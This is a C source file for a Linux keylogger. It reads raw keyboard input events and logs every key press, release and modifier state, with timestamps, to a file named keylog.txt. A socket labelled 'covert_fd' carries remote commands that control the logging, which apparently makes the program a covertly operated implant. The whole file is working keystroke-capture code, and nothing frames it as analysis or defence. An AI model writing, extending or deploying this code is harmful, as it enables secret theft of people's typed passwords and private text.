#include "keylog.h"
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <errno.h>
#include <string.h>
#include <sys/select.h>
#include <sys/time.h>

static modifier_state_t modifiers = {0, 0, 0, 0, 0};
static struct timeval start_time = {0, 0};
static int start_time_valid = 0;
static FILE *log_file = NULL;

static void update_modifiers(int code, int value) {
    int pressed = (value == 1);
    switch(code) {
        case KEY_LEFTSHIFT:
        case KEY_RIGHTSHIFT: modifiers.shift = pressed; break;
        case KEY_LEFTCTRL:
        case KEY_RIGHTCTRL: modifiers.ctrl = pressed; break;
        case KEY_LEFTALT:
        case KEY_RIGHTALT: modifiers.alt = pressed; break;
        case KEY_LEFTMETA:
        case KEY_RIGHTMETA: modifiers.meta = pressed; break;
        case KEY_CAPSLOCK: if (value == 1) modifiers.capslock = !modifiers.capslock; break;
    }
}

static void print_modifiers(void) {
    fprintf(log_file, " [");
    if (modifiers.shift) fprintf(log_file, "SHIFT ");
    if (modifiers.ctrl) fprintf(log_file, "CTRL ");
    if (modifiers.alt) fprintf(log_file, "ALT ");
    if (modifiers.meta) fprintf(log_file, "META ");
    if (modifiers.capslock) fprintf(log_file, "CAPS ");
    if (!modifiers.shift && !modifiers.ctrl && !modifiers.alt && !modifiers.meta && !modifiers.capslock)
        fprintf(log_file, "none");
    fprintf(log_file, "]");
}

static void print_relative_time(struct timeval *ev_time) {
    char time_buf[32];
    if (!start_time_valid) {
        start_time = *ev_time;
        start_time_valid = 1;
        snprintf(time_buf, sizeof(time_buf), "+0.000000");
    } else {
        long sec_delta = ev_time->tv_sec - start_time.tv_sec;
        long usec_delta = ev_time->tv_usec - start_time.tv_usec;
        if (usec_delta < 0) {
            sec_delta--;
            usec_delta += 1000000;
        }
        snprintf(time_buf, sizeof(time_buf), "+%ld.%06ld", sec_delta, usec_delta);
    }
    fprintf(log_file, "%-15s", time_buf);
}

static const char* event_type_to_string(int type) {
    switch(type) {
        case EV_SYN: return "EV_SYN";
        case EV_KEY: return "EV_KEY";
        case EV_REL: return "EV_REL";
        case EV_ABS: return "EV_ABS";
        case EV_MSC: return "EV_MSC";
        case EV_SW: return "EV_SW";
        case EV_LED: return "EV_LED";
        case EV_SND: return "EV_SND";
        case EV_REP: return "EV_REP";
        default: {
            static char buf[32];
            snprintf(buf, sizeof(buf), "TYPE_%d", type);
            return buf;
        }
    }
}

static const char* code_to_string_buf(int type, int code, char *buf, size_t buflen) {
    if (type == EV_KEY) {
        switch(code) {
            case KEY_ESC: return "KEY_ESC";
            case KEY_ENTER: return "KEY_ENTER";
            case KEY_BACKSPACE: return "KEY_BACKSPACE";
            case KEY_TAB: return "KEY_TAB";
            case KEY_SPACE: return "KEY_SPACE";
            case KEY_MINUS: return "KEY_MINUS";
            case KEY_EQUAL: return "KEY_EQUAL";
            case KEY_LEFTBRACE: return "KEY_LEFTBRACE";
            case KEY_RIGHTBRACE: return "KEY_RIGHTBRACE";
            case KEY_SEMICOLON: return "KEY_SEMICOLON";
            case KEY_APOSTROPHE: return "KEY_APOSTROPHE";
            case KEY_GRAVE: return "KEY_GRAVE";
            case KEY_BACKSLASH: return "KEY_BACKSLASH";
            case KEY_COMMA: return "KEY_COMMA";
            case KEY_DOT: return "KEY_DOT";
            case KEY_SLASH: return "KEY_SLASH";
            case KEY_CAPSLOCK: return "KEY_CAPSLOCK";
            case KEY_LEFTSHIFT: return "KEY_LEFTSHIFT";
            case KEY_RIGHTSHIFT: return "KEY_RIGHTSHIFT";
            case KEY_LEFTCTRL: return "KEY_LEFTCTRL";
            case KEY_RIGHTCTRL: return "KEY_RIGHTCTRL";
            case KEY_LEFTALT: return "KEY_LEFTALT";
            case KEY_RIGHTALT: return "KEY_RIGHTALT";
            case KEY_LEFTMETA: return "KEY_LEFTMETA";
            case KEY_RIGHTMETA: return "KEY_RIGHTMETA";
            case KEY_UP: return "KEY_UP";
            case KEY_DOWN: return "KEY_DOWN";
            case KEY_LEFT: return "KEY_LEFT";
            case KEY_RIGHT: return "KEY_RIGHT";
            case KEY_PAGEUP: return "KEY_PAGEUP";
            case KEY_PAGEDOWN: return "KEY_PAGEDOWN";
            case KEY_HOME: return "KEY_HOME";
            case KEY_END: return "KEY_END";
            case KEY_INSERT: return "KEY_INSERT";
            case KEY_DELETE: return "KEY_DELETE";
        }
        if (code >= KEY_F1 && code <= KEY_F12) { snprintf(buf, buflen, "KEY_F%d", code - KEY_F1 + 1); return buf; }
        if (code >= KEY_A && code <= KEY_Z) { snprintf(buf, buflen, "KEY_%c", 'A' + (code - KEY_A)); return buf; }
        if (code >= KEY_1 && code <= KEY_9) { snprintf(buf, buflen, "KEY_%d", code - KEY_1 + 1); return buf; }
        if (code == KEY_0) return "KEY_0";
        snprintf(buf, buflen, "KEY_%d", code); return buf;
    }
    snprintf(buf, buflen, "CODE_%d", code);
    return buf;
}

static const char* code_to_string(int type, int code) {
    static char buf[32];
    return code_to_string_buf(type, code, buf, sizeof(buf));
}

static const char* value_to_string(int type, int code, int value) {
    static char buf[32];
    if (type == EV_KEY) {
        switch(value) {
            case 0: return "RELEASE";
            case 1: return "PRESS";
            case 2: return "REPEAT";
            default: snprintf(buf, sizeof(buf), "STATE_%d", value); return buf;
        }
    }
    snprintf(buf, sizeof(buf), "%d", value);
    return buf;
}

void start_key_logging(int keyboard_fd, struct Context *ctx, struct List *list) {
    struct input_event ev;
    ssize_t n;
    fd_set readfds;
    struct timeval tv;
    int maxfd;
    int running = 1;

    int sock_fd = ctx->covert_fd;

    log_file = fopen("keylog.txt", "w");
    if (!log_file) return;

    fprintf(log_file, "RelTime         Type       Code                 Value          Modifiers\n");
    fflush(log_file);

    modifiers = (modifier_state_t){0,0,0,0,0};
    start_time_valid = 0;

    fcntl(keyboard_fd, F_SETFL, O_NONBLOCK);

    maxfd = keyboard_fd;
    if (sock_fd >= 0 && sock_fd > maxfd) maxfd = sock_fd;

    while (running) {
        FD_ZERO(&readfds);
        FD_SET(keyboard_fd, &readfds);
        if (sock_fd >= 0) FD_SET(sock_fd, &readfds);

        tv.tv_sec = 0;
        tv.tv_usec = 100000;

        int ret = select(maxfd + 1, &readfds, NULL, NULL, &tv);
        if (ret < 0) {
            if (errno == EINTR) continue;
            perror("select error");
            break;
        }

        if (FD_ISSET(keyboard_fd, &readfds)) {
            while ((n = read(keyboard_fd, &ev, sizeof(ev))) > 0) {
                if (n != sizeof(ev)) continue;
                if (ev.type != EV_KEY) continue;

                printf("\nkey event detected\n");
                char code_buf[32];
                print_relative_time(&ev.time);
                fprintf(log_file, " %-10s %-20s %-15s",
                        event_type_to_string(ev.type),
                        code_to_string_buf(ev.type, ev.code, code_buf, sizeof(code_buf)),
                        value_to_string(ev.type, ev.code, ev.value));
                print_modifiers();
                fprintf(log_file, "\n");
                fflush(log_file);

                update_modifiers(ev.code, ev.value);
            }
            if (n < 0 && errno != EAGAIN) perror("keyboard read");
        }

        if (sock_fd >= 0 && FD_ISSET(sock_fd, &readfds)) {
            runner_recv(ctx, list);
            if (list->type == CMD_STOP) running = 0;
            free_list(list);
        }
    }

    fclose(log_file);
    log_file = NULL;
}